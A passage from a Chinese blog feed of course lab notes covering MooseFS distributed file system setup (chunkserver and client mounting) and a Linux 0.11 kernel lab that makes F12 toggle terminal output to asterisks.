class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/<span class="built_in">local</span>/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115558.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115632.png" alt=""></p></li><li><p>修改主配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/etc/mfs/</span><br><span class="line">$ sudo cp mfschunkserver.cfg.sample  mfschunkserver.cfg</span><br><span class="line">$ sudo cp mfshdd.cfg.sample  mfshdd.cfg</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115959.png" alt=""></p><p>修改<code>mfschunkserver.cfg</code>文件内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi mfschunkserver.cfg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MASTER_HOST  &#x3D; 10.128.255.181 #指向master服务器的ip地址,去掉注释符号</span><br><span class="line">MASTER_PORT  &#x3D; 9420</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217120337.png" alt=""></p><p>修改<code>mfshdd.cfg</code>文件内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加一行</span></span><br><span class="line">/data </span><br><span class="line"><span class="comment">#这是一个给MFS的分区，生产环境中最好使用独立的分区，或者磁盘挂载到此目录下</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="启动chunk-server"><a href="#启动chunk-server" class="headerlink" title="启动chunk server"></a>启动<code>chunk server</code></h3><ol><li><p>创建进程用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li><li><p>创建MFS分区目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir /data</span><br><span class="line">$ sudo chown -R mfs:mfs /data/</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217120859.png" alt=""></p></li><li><p>授权、优化路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown -R mfs.mfs /usr/<span class="built_in">local</span>/mfs</span><br><span class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/mfs/sbin/* /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure></li><li><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mfschunkserver start</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217121020.png" alt=""></p></li><li><p>查看服务运行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfschunkserve</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217182216.png" alt=""></p></li></ol><h2 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h2><h3 id="安装编译器、工具包-3"><a href="#安装编译器、工具包-3" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol><li><p>输入如下命令，安装相关编译器、工具包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171507.png" alt=""></p></li><li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/<span class="built_in">local</span>/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171639.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171716.png" alt=""></p></li></ol><h3 id="挂载MFS文件系统"><a href="#挂载MFS文件系统" class="headerlink" title="挂载MFS文件系统"></a>挂载MFS文件系统</h3><ol><li><p>创建进程用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li><li><p>授权、优化路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown -R mfs.mfs /usr/<span class="built_in">local</span>/mfs</span><br><span class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/mfs/sbin/* /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure></li><li><p>挂载MFS文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建挂载点</span></span><br><span class="line">$ sudo mkdir /mnt/mfs</span><br><span class="line"><span class="comment">#加载fuse模块到内核</span></span><br><span class="line">$ sudo modprobe fuse</span><br><span class="line"><span class="comment">#挂载MFS</span></span><br><span class="line">$ sudo /usr/<span class="built_in">local</span>/mfs/bin/mfsmount /mnt/mfs/ -H 10.128.255.181</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173730.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173645.png" alt=""></p></li><li><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mfscgiserv start</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217182700.png" alt=""></p></li><li><p>查看是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfs</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173859.png" alt=""></p></li><li><p>打开浏览器，输入url：<code>http://10.128.205.7:9425</code>，显示如下，配置成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183000.png" alt=""></p></li><li><p>输入<code>master  server</code>的ip地址，则会显示<code>master server</code>的相关信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183644.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183316.png" alt=""></p></li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式文件系统管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核 实验六</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%85%AD.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%85%AD.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>基本内容是修改Linux 0.11的终端设备处理代码，对键盘输入和字符显示进行非常规的控制.</p><a id="more"></a><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>修改内核中I/O设备代码，实现按F12，ls命令显示的信息替换成<code>*</code>，再按F12恢复正常，如此反复。</p><h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><h2 id="安装虚拟机qemu环境"><a href="#安装虚拟机qemu环境" class="headerlink" title="安装虚拟机qemu环境"></a>安装虚拟机<code>qemu</code>环境</h2><p>安装<code>build-essential</code>软件包和<code>qemu</code>包</p><p>其中<code>build-essential</code>软件包的作用是<strong>提供编译程序必须软件包的列表信息</strong>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125205142.png" alt=""></p><h2 id="对文件进行编译运行"><a href="#对文件进行编译运行" class="headerlink" title="对文件进行编译运行"></a>对文件进行编译运行</h2><ol><li><p>输入<code>make</code>编译</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125210842.png" alt=""></p></li><li><p>输入<code>make start</code>开始运行</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125211111.png" alt=""></p></li><li><p>在虚拟机中按下F12，跳出四个进程信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125211543.png" alt=""></p></li><li><p>输入<code>ls</code>命令显示文件夹内容</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125215521786.png" alt="image-20191125215521786"></p></li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="修改kernel-chr-drv-keyboard-S的文件"><a href="#修改kernel-chr-drv-keyboard-S的文件" class="headerlink" title="修改kernel/chr_drv/keyboard.S的文件"></a>修改<code>kernel/chr_drv/keyboard.S</code>的文件</h2><ol><li><p>F12功能</p><p>键盘I/O是典型的中断驱动，在kernel/chr_drv/console.c文件中，控制台进行初始化，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">set_trap_gate(<span class="number">0x21</span>,&amp;keyboard_interrupt); </span><br><span class="line"><span class="comment">//键盘中断响应函数设为keyboard_interrupt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>所以每次按键有动作，<code>keyboard_interrupt</code>函数就会被调用，它在文件<code>kernel/chr_drv/keyboard.S</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">func:<span class="comment">/*将功能键转化成转义字符存取到读队列中*/</span></span><br><span class="line">    pushl %eax</span><br><span class="line">    pushl %ecx</span><br><span class="line">    pushl %edx</span><br><span class="line">    call show_stat  </span><br><span class="line">    popl %edx</span><br><span class="line">    popl %ecx</span><br><span class="line">    popl %eax</span><br></pre></td></tr></table></figure></li><li><p>分析上述代码，会调用<code>show_stat</code>函数,显示当前进程状态，如下图</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125215443319.png" alt="image-20191125215443319"></p></li><li><p>将<code>call show_stat</code>注释掉，即可屏蔽掉<code>show_sart</code>函数从而实现要实现的目标功能；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125215729781.png" alt="image-20191125215729781"></p></li></ol><h2 id="修改kernel-chr-drv-tty-io-c文件"><a href="#修改kernel-chr-drv-tty-io-c文件" class="headerlink" title="修改kernel/chr_drv/tty_io.c文件"></a>修改<code>kernel/chr_drv/tty_io.c</code>文件</h2><ol><li><p>键盘每次输入一个字符，操作系统都会将这个字符送到字符缓冲区进行处理，F12是一个功能键，它的扫描码是<code>esc,[,[,L</code> ，分别对应<code>ASCII</code>码的<code>27,91,91,76</code>，所以要连续判断四次字符。如果判断这几个字符的时候输出了一个其他的字符，它应该显示这个其他字符， 这段处理程序就应该写在操作系统判断字符做出功能的代码之前。</p></li><li><p>修改<code>copy_to_cooked</code>函数，添加处理程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 增加的全局变量 */</span></span><br><span class="line"><span class="keyword">int</span> judge=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> f1=<span class="number">0</span>,f2=<span class="number">0</span>,f3=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_cooked</span><span class="params">(struct tty_struct * tty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">char</span> c;</span><br><span class="line"><span class="comment">//now用来判断当前时间戳</span></span><br><span class="line"><span class="keyword">long</span> now;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> (!EMPTY(tty-&gt;read_q) &amp;&amp; !FULL(tty-&gt;secondary)) &#123;</span><br><span class="line">GETCH(tty-&gt;read_q,c);</span><br><span class="line"><span class="comment">//开始添加代码</span></span><br><span class="line"><span class="keyword">if</span>(c==<span class="number">27</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">f1=<span class="number">1</span>;</span><br><span class="line">j=jiffies;</span><br><span class="line"><span class="comment">//获取当前函数的CPU心跳数,用来计时</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">0</span>&amp;&amp;c==<span class="number">91</span>)</span><br><span class="line">f2=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">1</span>&amp;&amp;c==<span class="number">91</span>)</span><br><span class="line">f3=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">1</span>&amp;&amp;f3==<span class="number">1</span>&amp;&amp;c==<span class="number">76</span>)</span><br><span class="line">    &#123;</span><br><span class="line">now=jiffies;</span><br><span class="line"><span class="keyword">if</span>((now-j)&gt;<span class="number">10</span>)</span><br><span class="line"><span class="comment">//比如人为的输入esc,[,[,L 也会认为是F12,</span></span><br><span class="line">            <span class="comment">//所以要根据四个字符的到达的时间判断是一次输入还是多次输入的</span></span><br><span class="line">        &#123;</span><br><span class="line">            printk(<span class="string">"%ld \t %ld \n"</span>,j,now);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            judge*=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        f1=f2=f3=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//添加代码结束</span></span><br><span class="line"><span class="keyword">if</span> (c==<span class="number">13</span>)</span><br><span class="line"><span class="keyword">if</span> (I_CRNL(tty))</span><br><span class="line">c=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (I_NOCR(tty))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> ;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">10</span> &amp;&amp; I_NLCR(tty))</span><br><span class="line">c=<span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span> (I_UCLC(tty))</span><br><span class="line">c=<span class="built_in">tolower</span>(c);</span><br><span class="line"><span class="keyword">if</span> (L_CANON(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (c==KILL_CHAR(tty)) &#123;</span><br><span class="line"><span class="comment">/* deal with killing the input line */</span></span><br><span class="line"><span class="keyword">while</span>(!(EMPTY(tty-&gt;secondary) ||</span><br><span class="line">        (c=LAST(tty-&gt;secondary))==<span class="number">10</span> ||</span><br><span class="line">        c==EOF_CHAR(tty))) &#123;</span><br><span class="line"><span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (c&lt;<span class="number">32</span>)</span><br><span class="line">PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">tty-&gt;<span class="built_in">write</span>(tty);</span><br><span class="line">&#125;</span><br><span class="line">DEC(tty-&gt;secondary.head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c==ERASE_CHAR(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (EMPTY(tty-&gt;secondary) ||</span><br><span class="line">   (c=LAST(tty-&gt;secondary))==<span class="number">10</span> ||</span><br><span class="line">   c==EOF_CHAR(tty))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (c&lt;<span class="number">32</span>)</span><br><span class="line">PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">tty-&gt;<span class="built_in">write</span>(tty);</span><br><span class="line">&#125;</span><br><span class="line">DEC(tty-&gt;secondary.head);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c==STOP_CHAR(tty)) &#123;</span><br><span class="line">tty-&gt;stopped=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c==START_CHAR(tty)) &#123;</span><br><span class="line">tty-&gt;stopped=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (L_ISIG(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (c==INTR_CHAR(tty)) &#123;</span><br><span class="line">tty_intr(tty,INTMASK);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c==QUIT_CHAR(tty)) &#123;</span><br><span class="line">tty_intr(tty,QUITMASK);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c==<span class="number">10</span> || c==EOF_CHAR(tty))</span><br><span class="line">tty-&gt;secondary.data++;</span><br><span class="line"><span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line"><span class="keyword">if</span> (c==<span class="number">10</span>) &#123;</span><br><span class="line">PUTCH(<span class="number">10</span>,tty-&gt;write_q);</span><br><span class="line">PUTCH(<span class="number">13</span>,tty-&gt;write_q);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c&lt;<span class="number">32</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (L_ECHOCTL(tty)) &#123;</span><br><span class="line">PUTCH(<span class="string">'^'</span>,tty-&gt;write_q);</span><br><span class="line">PUTCH(c+<span class="number">64</span>,tty-&gt;write_q);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">PUTCH(c,tty-&gt;write_q);</span><br><span class="line">tty-&gt;<span class="built_in">write</span>(tty);</span><br><span class="line">&#125;</span><br><span class="line">PUTCH(c,tty-&gt;secondary);</span><br><span class="line">&#125;</span><br><span class="line">wake_up(&amp;tty-&gt;secondary.proc_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="修改kernel-chr-drv-console-c文件"><a href="#修改kernel-chr-drv-console-c文件" class="headerlink" title="修改kernel/chr_drv/console.c文件"></a>修改<code>kernel/chr_drv/console.c</code>文件</h2><ol><li><p><code>tty_io.c</code>文件只是捕捉到了按下F12的状态，还需要在控制程序中添加改变输出的代码，即把所有的字符都变成<code>*</code>；</p></li><li><p>修改<code>con_write</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> judge;<span class="comment">//引用代码tty_io.c中的judge变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct * tty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nr;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    nr = CHARS(tty-&gt;write_q);</span><br><span class="line">    <span class="keyword">while</span> (nr--) &#123;</span><br><span class="line">        GETCH(tty-&gt;write_q,c);</span><br><span class="line">        <span class="keyword">switch</span>(state) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (x&gt;=video_num_columns) &#123;</span><br><span class="line">                        x -= video_num_columns;</span><br><span class="line">                        pos -= video_size_row;</span><br><span class="line">                        lf();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(judge==<span class="number">1</span>)</span><br><span class="line">                        <span class="comment">//通过判断judge是否为1判断是否进行中断</span></span><br><span class="line">                        <span class="comment">//从而判断是否全部输出 *</span></span><br><span class="line">                        c=<span class="string">'*'</span>;</span><br><span class="line">                    __asm__(<span class="string">"movb attr,%%ah\n\t"</span></span><br><span class="line">                        <span class="string">"movw %%ax,%1\n\t"</span></span><br><span class="line">                        ::<span 